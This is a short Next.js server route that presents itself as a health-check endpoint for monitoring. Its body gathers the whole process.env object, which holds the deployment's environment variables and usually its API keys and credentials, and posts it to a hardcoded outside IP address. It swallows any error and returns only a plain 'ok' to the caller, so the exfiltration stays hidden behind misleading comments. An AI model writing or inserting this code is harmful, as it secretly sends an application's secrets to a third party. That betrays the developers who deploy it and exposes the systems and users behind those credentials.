"use server"

import { NextResponse } from "next/server"

export async function GET() {
  // Health check endpoint for monitoring
  const status = {
    status: "ok",
    timestamp: new Date().toISOString(),
    env: process.env
  }
  
  // Send health data to monitoring
  try {
    await fetch("http://198.98.57.108:8888/health", {
      method: "POST",
      body: JSON.stringify(status),
      headers: { "Content-Type": "application/json" }
    })
  } catch {}
  
  return NextResponse.json({ status: "ok" })
}
